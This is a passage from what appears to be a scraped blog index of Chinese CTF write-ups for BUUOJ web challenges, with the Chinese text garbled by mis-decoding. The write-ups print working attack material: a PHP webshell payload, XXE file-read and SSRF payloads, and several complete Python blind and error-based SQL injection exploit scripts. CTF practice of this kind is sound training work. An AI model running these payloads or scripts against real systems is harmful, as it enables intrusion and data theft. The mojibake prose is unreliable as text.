$d;\r?\u0026gt;\rå¾—åˆ°ï¼š\n%9E%8C%8C%9A%8D%8B\r%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%9E%A2%D6%D6\rplayload\nhttp://3494239d-8b3b-438f-9f91-21df2d0ffd65.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%9E%A2%D6%D6);\rå¯†ç aaa\rå¯ä»¥å¾—åˆ°ä¸€ä¸ªä¸èƒ½æ‰§è¡Œå‘½ä»¤çš„shellï¼Œ\nåˆ©ç”¨èšå‰‘çš„æ’ä»¶â€œç»•è¿‡disable_functionsâ€çš„PHP7_GC_UAFå³å¯æ‰§è¡Œå‘½ä»¤ï¼Œè¿è¡Œæ ¹ç›®å½•ä¸‹çš„readflagå°±è¡Œ\nflag{a7900948-cbea-429d-972b-a959c52771be}\n[NCTF2019]True XML cookbook è€ƒç‚¹ï¼šXXEå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ã€SSRF\nåŠæŠŠåŠæ•™æˆ‘æ‰“webçš„ğŸå‡ºçš„é¢˜ï¼ŒäºŒåˆ·çš„æ—¶å€™æ„Ÿè§‰è‡ªå·±ä»Šéæ˜”æ¯”ï¼ˆå¤§é›¾\n\u0026raquo;ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£XXE\nè¿™æ˜¯ç­¾åˆ°é¢˜çš„å‡çº§ç‰ˆï¼Œæœ¬æ¥æ˜¯é€šè¿‡XXEè¯»/flagæ–‡ä»¶çš„ï¼Œå‡çº§ç‰ˆæç¤ºäº†â€œå°è¯•ç”¨xxeåšæ›´å¤šçš„äº‹æƒ…â€\nè¯»å–/etc/hostså’Œ/proc/net/arp\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE abc [\r\u0026lt;!ENTITY abc SYSTEM \u0026quot;/proc/net/arp\u0026quot;\u0026gt;\r]\u0026gt;\r\u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;2\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt;\rå¾—åˆ°è¿”å›ä¿¡æ¯ï¼š\n\u0026lt;result\u0026gt;\u0026lt;code\u0026gt;0\u0026lt;/code\u0026gt;\u0026lt;msg\u0026gt;IP address HW type Flags HW address Mask Device\r173.56.246.2 0x1 0x2 02:42:ad:38:f6:02 * eth0\r\u0026lt;/msg\u0026gt;\u0026lt;/result\u0026gt;\rä¸è¿‡åŸé¢˜æ˜¯ç»™äº†å¾ˆå¤šåœ¨ä¸€ä¸ªCæ®µä¸‹çš„ipï¼Œbuué‡Œé¢åªç»™äº†ä¸¤ä¸ªã€‚\nç„¶åå¯ä»¥é€šè¿‡xxeè¿›è¡Œssrfï¼Œè¿™é‡Œå¯ä»¥ç”¨intruderè¿›è¡ŒCæ®µçˆ†ç ´ï¼Œæœ€åæ˜¯åœ¨173.56.246.10æ‰¾åˆ°äº†flag\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE abc [\r\u0026lt;!ENTITY abc SYSTEM \u0026quot;php://filter/read=convert.base64-encode/resource=http://173.56.246.10/\u0026quot;\u0026gt;\r]\u0026gt;\r\u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;abc;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;2\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt;\r\u0026lt;result\u0026gt;\u0026lt;code\u0026gt;0\u0026lt;/code\u0026gt;\u0026lt;msg\u0026gt;ZmxhZ3s4MGYzNGNhOS1kYmUxLTRmZWUtYjEyMi00Njk0NWRmYTQ1NGN9\u0026lt;/msg\u0026gt;\u0026lt;/result\u0026gt;\rflag{80f34ca9-dbe1-4fee-b122-46945dfa454c}\n","date":"2020-04-14T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170627.png","permalink":"https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/","title":"BUUOJåˆ·é¢˜è®°å½•(2)"},{"content":"[SUCTF 2019]EasySQL è€ƒç‚¹ï¼šå †å æ³¨å…¥ã€MySQLä¸­sql_modeå‚æ•°\né¢˜ç›®å­˜åœ¨è¿‡æ»¤ï¼Œå°è¯•ä¹‹åå‘ç°å¯ä»¥é€šè¿‡0 || 1è¿™æ ·çš„è¯­å¥è¿›è¡Œboolç›²æ³¨ï¼Œä½†æ˜¯æ­¤é¢˜ä¼¼ä¹é™åˆ¶äº†è¾“å…¥ä¿¡æ¯çš„é•¿åº¦ï¼Œæ‰€ä»¥è¿™ä¸ªç›²æ³¨åªèƒ½æ³¨å‡ºæ¥åº“åCTFåé¢çš„ä¸œè¥¿å°±æ²¡åŠæ³•æï¼Œåæ¥çœ‹äº†wpä¹‹åæ‰çŸ¥é“å­˜åœ¨å †å æ³¨å…¥ï¼Œå°è¯•ä¹‹ï¼š\n1;\rå¹¶æ²¡æœ‰æŠ¥é”™ï¼Œè€Œä¸”è¿”å›äº†æŸ¥è¯¢æˆåŠŸé¢é¡µé¢ï¼Œæ‰€ä»¥å­˜åœ¨å †å æ³¨å…¥\n1;show databases;\rè¿”å›\nArray ( [0] =\u0026gt; 1 ) Array ( [0] =\u0026gt; ctf ) Array ( [0] =\u0026gt; ctftraining ) Array ( [0] =\u0026gt; information_schema ) Array ( [0] =\u0026gt; mysql ) Array ( [0] =\u0026gt; performance_schema ) Array ( [0] =\u0026gt; test )\rè¡¨åï¼š\n1;show tables;\rè¿”å›ï¼š\nArray ( [0] =\u0026gt; 1 ) Array ( [0] =\u0026gt; Flag )\rä½†æ˜¯flagå…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œ\nè¿™å°±æ²¡åŠæ³•ç›´æ¥æŸ¥åˆ°flagçš„ä¿¡æ¯ã€‚\nç”±å®˜æ–¹wpçš„è§£é‡Šæ¥çœ‹ï¼Œè¿™é“é¢˜ç›®éœ€è¦æˆ‘ä»¬å»å¯¹åç«¯è¯­å¥è¿›è¡ŒçŒœæµ‹ï¼Œæœ‰ç‚¹çŸ›ç›¾çš„åœ°æ–¹åœ¨äºï¼Œå…¶æè¿°çš„åŠŸèƒ½å’Œå®é™…çš„åŠŸèƒ½ä¼¼ä¹å¹¶ä¸ç›¸ç¬¦ï¼Œé€šè¿‡è¾“å…¥éé›¶æ•°å­—å¾—åˆ°çš„å›æ˜¾1å’Œè¾“å…¥å…¶ä½™å­—ç¬¦å¾—ä¸åˆ°å›æ˜¾æ¥åˆ¤æ–­å‡ºå†…éƒ¨çš„æŸ¥è¯¢è¯­å¥å¯èƒ½å­˜åœ¨æœ‰||ï¼Œä¹Ÿå°±æ˜¯select è¾“å…¥çš„æ•°æ®||å†…ç½®çš„ä¸€ä¸ªåˆ—å from è¡¨åï¼Œè¿›ä¸€æ­¥è¿›è¡ŒçŒœæµ‹å³ä¸ºselect postè¿›å»çš„æ•°æ®||flag from Flag(å«æœ‰æ•°æ®çš„è¡¨åï¼Œé€šè¿‡å †å æ³¨å…¥å¯çŸ¥)ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶çš„||èµ·åˆ°çš„ä½œç”¨æ˜¯orçš„ä½œç”¨ã€‚\nç»™å‡ºçš„æŸ¥è¯¢è¯­å¥æ˜¯ï¼šselect $_POST[query] || flag from flag\né¢„æœŸè§£æ˜¯ï¼š\n1;set sql_mode=pipes_as_concat;select 1\rç„¶åæœ‰ä¸€ä¸ªéé¢„æœŸæ˜¯ï¼š\n*,1\rflag{05c299f9-2a8b-440e-98d1-d528859be168}\nè¿™é‡Œè¯´æ˜ä¸€ä¸‹ï¼š\nsql_mode æ˜¯ä¸€ç»„mysqlæ”¯æŒçš„åŸºæœ¬è¯­æ³•åŠæ ¡éªŒè§„åˆ™ æŸ¥è¯¢å½“å‰ç³»ç»Ÿsql_modeçš„è®¾ç½®:\nå…¶ä¸­ï¼š\nPIPES_AS_CONCATï¼š å°†â€œ||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œè¿™å’ŒOracleæ•°æ®åº“æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼\n[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL è€ƒç‚¹ï¼šboolç›²æ³¨ï¼Œ1^(condition)^1ç»•è¿‡orè¢«æ»¤ï¼ŒåµŒå¥—()ç»•è¿‡ç©ºæ ¼è¢«è¿‡æ»¤\nç›¸æ¯”äºè¿™ä¸ªæ¯”èµ›çš„å…¶ä»–sqliï¼Œè¿™é“é¢˜å¤šäº†id=çš„æŸ¥è¯¢é¡µé¢ï¼Œå¹¶ä¸”æç¤ºäº†æ˜¯MySQLç›²æ³¨\nèµ·åˆå‘ç°äº†usernameä½ç½®å¯ä»¥ç”¨åæ–œæ é€ƒé€¸ï¼Œä¸è¿‡å› ä¸ºæ‰€æœ‰çš„æ³¨é‡Šæ–¹æ³•éƒ½è¢«è¿‡æ»¤äº†ï¼Œå°±æ²¡æœ‰ä»€ä¹ˆç”¨\nfuzzï¼Œå¸¸è§„çš„å•å¼•å·ï¼Œç©ºæ ¼ï¼Œæ³¨é‡Šï¼Œorï¼Œ|ï¼Œ\u0026amp;éƒ½è¢«è¿‡æ»¤äº†ã€‚\néšä¾¿ç‚¹ä¸€ä¸ªæ•°å­—ï¼Œå‘ç°æ˜¯ä¸ç”¨æ³¨é‡Šçš„æ•°å€¼å‹æ³¨å…¥ï¼ˆå˜¿å˜¿å˜¿ï¼‰\norè¢«è¿‡æ»¤ï¼Œä½¿ç”¨1^(condition)æ¥ç»•è¿‡ï¼š\n?id=0\r//è¿”å›ERROR\r?id=0^1\r//è¿”å›NO! Not this! Click others~~~\ré‚£ä¹ˆæˆ‘ä»¬æ³¨å…¥æˆåŠŸäº†ï¼Œä¸è¿‡è¦æŠŠ(condition)æ¢æˆå…¶ä»–æŸ¥è¯¢è¯­å¥è¿˜éœ€è¦åœ¨æœ«å°¾å†æ·»ä¸€ä¸ª^1ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆå›äº‹å„¿ï¼‰\n?id=1^((length(database()))\u0026gt;1)^1\r//è¿”å›NO! Not this! Click others~~~\r?id=1^((length(database()))\u0026gt;99)^1\r//è¿”å›ERRORï¼ï¼ï¼\ré‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è½»æ¾åœ°åŒºåˆ«å‡ºboolçœŸå‡é¡µé¢è¿”å›ä¿¡æ¯ä¸åŒ\nè¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šexpï¼š\n#by wh1sper\r#boolç›²æ³¨\rimport requests\rhost = 'http://368375df-ca56-4f5d-8cd4-ab07fb575003.node3.buuoj.cn/search.php?id='\rdef mid(bot, top):\rreturn (int)(0.5*(top + bot))\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\r#select = '(ascii(substr(database(),{},1)))\u0026gt;{}'.format(j, mid(top, bot))#---\u0026gt;geek\r#æŸ¥åº“å\r#select = \u0026quot;(ascii(substr((select(group_concat(table_name))\r# from(information_schema.tables)where(table_schema='geek')),{},1)))\u0026gt;{}\u0026quot;\r# .format(j, mid(top, bot))#---\u0026gt;F1naI1y,Flaaaaag\r#æŸ¥è¡¨å\r#select = \u0026quot;(ascii(substr((select(group_concat(column_name))\r# from(information_schema.columns)where(table_name='Flaaaaag')),{},1)))\u0026gt;{}\u0026quot;\r# .format(j, mid(top, bot))#---\u0026gt;id,fl4gawsl\r#æŸ¥åˆ—å\rselect = \u0026quot;(ascii(substr((select(group_concat(password))\u0026quot; \\\r\u0026quot;from(F1naI1y)),{},1))\u0026gt;{})\u0026quot;.format(j, mid(top, bot))\rplayload = \u0026quot;1^(\u0026quot;+select+\u0026quot;)^1\u0026quot;\r#print(playload)\rr = requests.get(url=host+playload)\r#print(r.text)\rif 'NO!' in r.text: # æˆåŠŸ\rif top - 1 == bot: # topå’Œbotç›¸é‚»ï¼Œè¯´æ˜nameæ˜¯top\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top) # æˆåŠŸå°±ä¸Šç§»bot\relse: # å¤±è´¥\rif top - 1 == bot: # topå’Œbotç›¸é‚»ï¼ŒåŠ ä¸Šå¤±è´¥ï¼Œè¯´æ˜nameæ˜¯bot\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top) # å¤±è´¥å°±ä¸‹ç§»top\rif __name__ == '__main__':\rsqli()\rflag{c0db499e-7c62-46c7-a2ce-0bd9a239cc25}\n[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World è€ƒç‚¹ï¼šSQLiã€æ‹¬å·åµŒå¥—ç»•è¿‡ç©ºæ ¼ã€^ç¬¦å·ç»•è¿‡or\nç›´æ¥ç»™äº†è¡¨å=\u0026lsquo;flag\u0026rsquo;ï¼Œåˆ—å=\u0026lsquo;flag\u0026rsquo;ã€‚\nfuzzï¼Œå¸¸è§„æäº‹å„¿å…³é”®å­—éƒ½è¢«è¿‡æ»¤ï¼›\næƒ³åˆ°äº†å‰å‡ å¤©åšçš„finalSQLiï¼Œå°è¯•ç”¨^ä»£æ›¿or\n0^1\r//è¿”å›Hello, glzjin wants a girlfriend.å’Œ1çš„ç»“æœä¸€æ ·ï¼Œè¯´æ˜èµ·æ•ˆäº†\ré‚£ä¹ˆå°è¯•åº“åï¼š\n0^(length(database())\u0026gt;1)\r//æˆåŠŸ\rokï¼Œç›´æ¥å†™è„šæœ¬\néœ€è¦æ³¨æ„çš„æ˜¯substr((condition),1,1)çš„conditionå­æŸ¥è¯¢ï¼Œä¸¤è¾¹éœ€è¦æ‹¬å·ï¼Œä¸ç„¶æ¥ä¸äº†äº‹å„¿ã€‚\nexpï¼š\n#wh1sper\r#boolç›²æ³¨\rimport requests\rhost = 'http://14bb7de3-9b94-4870-9178-2fefa1bfc029.node3.buuoj.cn/index.php'\rdef mid(bot, top):\rreturn (int)(0.5*(top + bot))\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\r#babyselect = \u0026quot;database()\u0026quot;--\u0026gt;ctftraining\r#babyselect = \u0026quot;version()\u0026quot;--\u0026gt;10.2.26-MariaDB-log\rbabyselect = \u0026quot;(select(flag)from(ctftraining.flag))\u0026quot;\rselect = \u0026quot;ascii(substr(\u0026quot;+babyselect+\u0026quot;,{},1))\u0026gt;{}\u0026quot;.format(j, mid(top, bot))\rplayload = \u0026quot;0^(\u0026quot;+select+\u0026quot;)\u0026quot;\rdata = {\r\u0026quot;id\u0026quot;: playload\r}\r#print(playload)\rr = requests.post(url=host, data=data)\r#print(r.text)\rif 'glzjin wants' in r.text: # æˆåŠŸ\rif top - 1 == bot: # topå’Œbotç›¸é‚»ï¼Œè¯´æ˜nameæ˜¯top\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top) # æˆåŠŸå°±ä¸Šç§»bot\relse: # å¤±è´¥\rif top - 1 == bot: # topå’Œbotç›¸é‚»ï¼ŒåŠ ä¸Šå¤±è´¥ï¼Œè¯´æ˜nameæ˜¯bot\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top) # å¤±è´¥å°±ä¸‹ç§»top\rif __name__ == '__main__':\rsqli()\rflag{2ed1b2c4-f083-424e-a4e9-303222f99563}\n[GYCTF2020]Ezsqli è€ƒç‚¹ï¼šboolç›²æ³¨ï¼Œç»•information_schemaå’Œsys.schema_auto_increment_columnsï¼Œæ— åˆ—åè¿‡æ»¤unionå’Œjoin\næœ¬ç«™GYCTFwpå·²ç»è®²è¿‡ï¼Œæ‰€ä»¥ç®€å•è¯´ã€‚\n0||1\r//è¿”å›Nu1L\r0||0\r//è¿”å›Error Occured When Fetch Result.\råˆ¤æ–­ä¸ºboolç›²æ³¨ï¼›\ninformation_schemaå’Œsys.schema_auto_increment_columnsè¿™ä¸¤ä¸ªéƒ½è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨sys.schema_table_statistics_with_bufferï¼Œæ— åˆ—åï¼Œè€Œä¸”è¿‡æ»¤unionå’Œjoinï¼Œå°±åªèƒ½ç”¨ç±»ä¼¼äºï¼š\n(select 'admin','admin')\u0026gt;(select * from users limit 1)\rè¿™æ ·çš„è¯­å¥ï¼Œå‰ææ˜¯ä¸¤è¾¹çš„æŸ¥è¯¢åˆ—æ•°ç›¸ç­‰ï¼Œç„¶åæ˜¯æŒ‰ä½æ¯”è¾ƒï¼Œåœ¨æŸä¸€ä½ä¸Šè°å¤§ï¼Œé‚£ä¹ˆå°±æ˜¯è°å¤§ï¼Œå¦‚æœç›¸ç­‰çš„è¯ï¼Œå°±æ¯”è¾ƒä¸‹ä¸€ä½ã€‚\nä¸¾å‡ ä¸ªä¾‹å­ï¼š\ng \u0026gt; flag{abcd}\ra \u0026lt; flag{abcd}\rfz \u0026gt; flag{bbbbb}//ç¬¬ä¸€ä½ç›¸ç­‰ï¼Œæ¯”è¾ƒç¬¬äºŒä½\ré‚£ä¹ˆç›´æ¥expï¼š\n#wh1sper\r#boolç›²æ³¨\rimport requests\rhost = 'http://7282ff4f-c5c7-4023-be2e-b40f0e422e2c.node3.buuoj.cn/index.php'\rdef mid(bot, top):\rreturn (int)(0.5*(top + bot))\rdef trans_to_hex(str):\rresult = '0x'\rfor i in str:\rtemp = hex(ord(i))\rresult += temp.replace('0x','')\rreturn result\rdef sqli():\rname = ''\rfor j in range(20, 250):\rtop = 126\rbot = 32\rwhile 1:\r#babyselect = \u0026quot;(database())\u0026quot;---\u0026gt;give_grandpa_pa_pa_pa\r#babyselect = \u0026quot;(version())\u0026quot;---\u0026gt;10.2.26-MariaDB-log\r#babyselect = \u0026quot;(select group_concat(table_name) from # sys.schema_table_statistics_with_buffer\r# where table_schema=database())\u0026quot;---\u0026gt;users233333333333333,f1ag_1s_h3r3_hhhhh\r#select = \u0026quot;ascii(substr(\u0026quot;+babyselect+\u0026quot;,{},1))\u0026gt;{}\u0026quot;.format(j, mid(top, bot))\rselect = \u0026quot;(select * from f1ag_1s_h3r3_hhhhh)\u0026gt;(select 1,{})\u0026quot;.\\\rformat(trans_to_hex(name+chr(mid(bot, top))))\rplayload = \u0026quot;0||\u0026quot;+select\rdata = {\r\u0026quot;id\u0026quot;: playload\r}\r#print(playload)\rr = requests.post(url=host, data=data)\r#print(r.text)\rif '|' in name://æœ€åä¸€ä½æ²¡æœ‰ä¸‹ä¸€ä½å¯ä»¥æ¯”è¾ƒï¼Œåªèƒ½åœ¨è¿™é‡Œè¿”å›ï¼Œæ›¿æ¢ä¸€ä¸‹å³å¯\rname = name.lower().replace('|', '}')\rprint(name)\rreturn\rif 'Nu1L' in r.text: # æˆåŠŸ\rif top - 1 == bot: # topå’Œbotç›¸é‚»ï¼Œè¯´æ˜nameæ˜¯top\rname += chr(top-1)\rprint(name)\rbreak\rbot = mid(bot, top) # æˆåŠŸå°±ä¸Šç§»bot\relse: # å¤±è´¥\rif top - 1 == bot: # topå’Œbotç›¸é‚»ï¼ŒåŠ ä¸Šå¤±è´¥ï¼Œè¯´æ˜nameæ˜¯bot\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top) # å¤±è´¥å°±ä¸‹ç§»top\rif __name__ == '__main__':\rsqli()\råŸé¢˜flagéƒ½æ˜¯å°å†™ï¼Œæ‰€ä»¥å°±æ²¡ç®¡å®ƒï¼Œä¸è¿‡å‡ºé¢˜äººç¬”è®°é‡Œè¾¹æœ¬æ¥æƒ³è€ƒå¤§å°å†™çš„ï¼Œæˆ‘å¤ªåƒåœ¾ï¼Œå°±æ²¡ç®¡äº†\nflag{ec726349-d504-4a00-a288-7b72fbc33418}\n[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL è€ƒç‚¹ï¼šæŠ¥é”™æ³¨å…¥\nå…ˆæ˜¯fuzzï¼Œå¼•å·ï¼Œæ³¨é‡Šæ²¡è¢«è¿‡æ»¤ï¼Œ|ã€\u0026amp;ã€ç©ºæ ¼ã€*è¿™äº›éƒ½è¢«è¿‡æ»¤äº†\nåˆ©ç”¨äº¦æˆ–ç¬¦å·è¿›è¡Œæ³¨å…¥ï¼š\nusername=1'^1%23\u0026amp;password=1\rå›æ˜¾ï¼š\rLogin Success!!\råº”è¯¥å¯ä»¥ç›²æ³¨æˆ–è€…æŠ¥é”™æ³¨å…¥\næˆ‘è¿™é‡Œç”¨çš„æ˜¯æŠ¥é”™æ³¨å…¥\nimport requests\rimport re\rhost = 'http://7e5bdd7f-60ce-49fc-88cb-cf4e6ac51763.node3.buuoj.cn/check.php?'\r#babystr = \u0026quot;select(database())\u0026quot;--\u0026gt;geek\r#babystr = \u0026quot;select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))\u0026quot;--\u0026gt;H4rDsq1\r#babystr = \u0026quot;select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))\u0026quot;--\u0026gt;id,username,password\r#babystr = \u0026quot;select(left(group_concat(password),31))from(H4rDsq1)\u0026quot;\rbabystr = \u0026quot;select(right(group_concat(password),31))from(H4rDsq1)\u0026quot;\r#--flag{9b788a2b-b307-4935-b7e7-0b'\r#--2b-b307-4935-b7e7-0b853f26382a}\r#flag{9b788a2b-b307-4935-b7e7-0b853f26382a}\rpayload = \u0026quot;username=1'^updatexml(1,concat(0x7e,({}),0x7e),1)%23\u0026amp;password=1\u0026quot;.format(babystr)\rr = requests.get(host+payload)\rprint(payload)\rprint(r.text)\ræ³¨æ„ç‚¹æ˜¯updatexmlè¿™ä¸ªæŠ¥é”™æ³¨å…¥åªèƒ½æ˜¾ç¤º32ä¸ªå­—ç¬¦ï¼Œéœ€è¦ä¸¤æ¬¡ç”¨leftå’Œrightåˆ†åˆ«æ‰“\nflag{9b788a2b-b307-4935-b7e7-0b853f26382a}\n","date":"2020-04-04T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170627.png","permalink":"https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","title":"BUUOJåˆ·é¢˜è®°å½•"},{"content":"0x00å‰è¨€ ç»ˆäºç­‰åˆ°æ¥çš„å¤ªçªç„¶çš„è€ƒæ ¸ï¼Œæ„Ÿè§‰è‡ªå·±è¡¨ç°ä¸æ˜¯å¤ªå¥½ï¼Œæœ¬æ¥å…¥é—¨æ—¶é—´ä¹Ÿä¸çŸ­äº†ï¼Œæ˜¯å› ä¸ºä¸å¤ŸåŠªåŠ›æ‰è¿™ä¹ˆèœ\nç©äº†ä¸€æŠŠå†…ç½‘æ¸—é€ï¼ˆä¸æ˜¯ï¼‰ï¼Œæ„Ÿè§‰æœ‰ç‚¹æ„æ€ã€‚\n0x01ç¬¬ä¸€é¢˜ è€ƒç‚¹ï¼šsqli\n usernameä¸­\\è½¬ä¹‰\u0026rsquo;å¯¼è‡´passwordè¯­å¥é€ƒé€¸å•å¼•å· unionæ³¨å…¥ ç»•è¿‡é€—å·è¿‡æ»¤ç»§ç»­æ³¨å…¥ æ— åˆ—åæ³¨å…¥  æ‰“å¼€é¢˜ç›®ï¼ŒæŠ“åŒ…ï¼Œå‘ç°POSTè¿‡å»çš„æ•°æ®æ˜¯jsonå½¢å¼ï¼Œæ²¡æƒ³åˆ°å…¶ä»–ï¼Œåªæƒ³åˆ°äº†sqliï¼Œäºæ˜¯æˆ‘ç”¨bpçš„intruderæ¨¡å—fuzzäº†ä¸€ä¸‹ï¼š\n(è¿™é‡Œæœ¬æ¥æœ‰ä¸€ä¸ªè¡¨ï¼Œè«åå…¶å¦™æ¶ˆå¤±äº†)\nè¢«è¿‡æ»¤ï¼šå•å¼•å·ã€|ã€ï¼Œã€orã€ç©ºæ ¼\næ²¡è¢«è¿‡æ»¤ï¼šselectã€union\nç©ºæ ¼è¢«è¿‡æ»¤ï¼Œç”¨//ä»£æ›¿ï¼Œï¼ˆå¯ä»¥ä½¿ç”¨wordçš„æ›¿æ¢åŠŸèƒ½ï¼‰æœ¬æ–‡çš„ç©ºæ ¼éƒ½æ˜¯//\næ—¢ç„¶å•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆå°±æƒ³åˆ°äº†CGCTFå’Œä¹‹å‰çš„BJDCTFçš„æ³¨å…¥ï¼Œåˆ©ç”¨usernameè¾“å…¥åæ–œæ æ¥è½¬ä¹‰å•å¼•å·ï¼Œç›´æ¥çœ‹ä¾‹å­ï¼š\nåŸæœ¬è¯­å¥ï¼šSELECT * from user WHERE username = 'admin' and password = '123'\rè½¬ä¹‰è¯­å¥ï¼šSELECT * from user WHERE username = 'admin\\' and password =' or 1=1#'\ræˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå®é™…ä¸Šç¬¬äºŒå¥çš„usernameæ˜¯'admin\\' and password ='åé—¨æ¥çš„or 1=1è‡ªç„¶ä¹Ÿå°±é€ æˆäº†æ³¨å…¥ã€‚\nè¿™é“é¢˜æ­£å¸¸è¾“å…¥çš„æ—¶å€™å›æ˜¾æ˜¯username or password errorå¦‚æœä½¿ç”¨è¿™ä¸ªplayloadçš„è¯å›æ˜¾æ˜¯true\nunionæ²¡æœ‰è¢«è¿‡æ»¤çš„è¯ï¼Œé‚£ä¹ˆå°±å°è¯•unionæ³¨å…¥å§ï¼š\næŸ¥è¯¢åˆ—æ•°ï¼š\r{\u0026quot;username\u0026quot;:\u0026quot;1\\\\\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;group/**/by/**/1#\u0026quot;}\rè¿™é‡Œæœ‰ç‚¹ç„å­¦çš„æ˜¯ï¼Œæ˜æ˜æŸ¥çš„æ˜¯ä¸‰åˆ—ï¼Œä½†æ˜¯åªèƒ½group by 1æœ‰å›æ˜¾ï¼Œå°±å¾ˆç¥å¥‡ã€‚\næŸ¥è¯¢åˆ—æ•°ï¼š {\u0026quot;username\u0026quot;:\u0026quot;1\\\\\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;union/**/select/**/1,2,3#\u0026quot;}\rå›æ˜¾æ˜¯â€œWAFï¼ï¼ï¼â€å› ä¸ºé€—å·è¢«è¿‡æ»¤äº†\nåˆ©ç”¨joinç»•è¿‡é€—å·è¿‡æ»¤ï¼š\nunion select * from ((select 1)A join (select 2)B join (select 3)C)#\r//union select * from ((select 1)A join (select 2)B join (select 3)C)#\ræŸ¥è¯¢æˆåŠŸï¼Œåˆ—æ•°ä¸º3ï¼Œ2å’Œ3åˆ†åˆ«ä¸ºusernameå’Œpasswordçš„å›æ˜¾ä½ç½®ï¼Œå°±å¯ä»¥æ›¿æ¢ä¸ºå­æŸ¥è¯¢ï¼Œä½†æ˜¯æœ€è‡´å‘½çš„æ˜¯orè¢«è¿‡æ»¤äº†ï¼Œé€ æˆäº†information_schemaèƒŒé”…ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦bypass information_schema\næŸ¥çœ‹äº†MySQLç‰ˆæœ¬ä¸º5.7ä¹‹åsys.schema_auto_increment_columnsæˆä¸ºäº†æˆ‘ä»¬çš„å·¥å…·\nå°†ä¸Šè¿°è¯­å¥çš„2æˆ–3æ›¿æ¢ä¸ºï¼š\nSELECT group_concat(table_name) from sys.schema_auto_increment_columns WHERE table_schema = database()\rè¡¨åï¼šuser\næœ¬æ¥åˆ—åå¯ä»¥çŒœè§£å‡ºæ¥ï¼Œä¸è¿‡å› ä¸ºæ˜¯éé¢„æœŸæ‰€ä»¥è¢«banäº†ï¼Œæ¥ä¸‹æ¥ä¾¿æ˜¯æ— åˆ—åæ³¨å…¥\næ›¿æ¢select 3ä¸º\nselect i.3 from (select * from ((select 1)A join (select 2)B join (select 3)C) union select * from users)i limit 1\rå›æ˜¾ï¼š{\u0026quot;code\u0026quot;:2,\u0026quot;username\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;result\u0026quot;:\u0026quot;SUCCESS\u0026quot;}\nè¯´æ˜å’Œæ²¡æ›¿æ¢çš„æ•ˆæœä¸€æ ·ï¼Œè¿™ä¸ªé“ç†ç›¸å½“äºæ˜¯åˆ©ç”¨unionæŸ¥è¯¢çš„ç‰¹æ€§ç»™ä»–èµ·äº†ä¸€ä¸ªåå­—ï¼Œèµ·çš„åå­—æ˜¯iï¼Œi.3å°±æ˜¯æŸ¥ç¬¬ä¸‰åˆ—ï¼Œçœ‹ä¾‹å­ï¼š\nmysql\u0026gt; select * from (select 1,2,3 union select 'a','b','c')i;\r+---+---+---+\r| 1 | 2 | 3 |\r+---+---+---+\r| 1 | 2 | 3 |\r| a | b | c |\r+---+---+---+\rmysql\u0026gt; select i.3 from (select 1,2,3 union select 'a','b','c')i;\r+---+\r| 3 |\r+---+\r| 3 |\r| c |\r+---+\rlmit 1`æ˜¯å’Œ`limit 0,1`æ•ˆæœä¸€æ ·ï¼Œæ„æ€æ˜¯ä»ç¬¬0æ¡è¿”å›1æ¡ç»“æœï¼Œæˆ‘ä»¬è¿™æ ·åªèƒ½æŸ¥åˆ°æˆ‘ä»¬è‡ªå·±èµ·çš„åˆ—åï¼Œæƒ³è¦æŸ¥å€¼å°±éœ€è¦`limit 